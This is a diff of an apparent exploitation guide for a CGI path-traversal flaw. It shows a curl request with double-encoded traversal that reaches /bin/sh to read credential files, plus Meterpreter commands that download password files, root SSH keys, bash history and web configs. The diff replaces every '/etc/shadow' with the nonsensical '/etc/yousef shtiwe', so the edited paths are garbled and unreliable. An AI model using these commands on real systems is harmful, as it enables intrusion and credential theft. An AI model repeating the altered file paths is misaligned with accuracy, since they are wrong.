@@ -94,7 +94,7 @@ Path traversal:     GET /cgi-bin/../../../etc/passwd → /etc/passwd
 
 **What you can do with file read:**
 - Read `/etc/passwd` - list system users
-- Read `/etc/shadow` - password hashes (if readable)
+- Read `/etc/yousef shtiwe` - password hashes (if readable)
 - Read config files - database credentials, API keys
 - Read SSH keys - `/root/.ssh/id_rsa`
 - Read source code - application secrets
@@ -203,7 +203,7 @@ curl -X POST "http://target:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin
 **Read sensitive file:**
 ```bash
 curl -X POST "http://target:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
-  -d "echo Content-Type: text/plain; echo; cat /etc/shadow"
+  -d "echo Content-Type: text/plain; echo; cat /etc/yousef shtiwe"
 ```
 
 **Reverse shell:**
@@ -223,7 +223,7 @@ curl -X POST "http://target:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin
 #### Exploitation Types
 
 **1. Path Traversal (File Read)**
-- Read sensitive files: `/etc/passwd`, `/etc/shadow`, config files
+- Read sensitive files: `/etc/passwd`, `/etc/yousef shtiwe`, config files
 - Gather credentials, SSH keys, API tokens
 - Map the system structure
 
@@ -450,11 +450,11 @@ meterpreter > ls -la /root         # List with details
 
 # Read files
 meterpreter > cat /etc/passwd      # Display file content
-meterpreter > cat /etc/shadow      # Password hashes
+meterpreter > cat /etc/yousef shtiwe      # Password hashes
 
 # Download files (to your machine)
 meterpreter > download /etc/passwd /tmp/passwd.txt
-meterpreter > download /etc/shadow /tmp/shadow.txt
+meterpreter > download /etc/yousef shtiwe /tmp/yousef shtiwe.txt
 meterpreter > download -r /var/www/html /tmp/website
 
 # Upload files (to target)
@@ -484,7 +484,7 @@ meterpreter > search -f *.env -d /var/www
 meterpreter > search -f id_rsa -d /
 
 # Download sensitive files
-meterpreter > download /etc/shadow
+meterpreter > download /etc/yousef shtiwe
 meterpreter > download /root/.ssh/id_rsa
 meterpreter > download /root/.bash_history
 
@@ -848,7 +848,7 @@ meterpreter > execute -f "/bin/bash" -c -i
 ```bash
 # Download important files
 meterpreter > download /etc/passwd
-meterpreter > download /etc/shadow
+meterpreter > download /etc/yousef shtiwe
 meterpreter > download /root/.ssh/id_rsa
 meterpreter > download /var/www/html/config.php
 
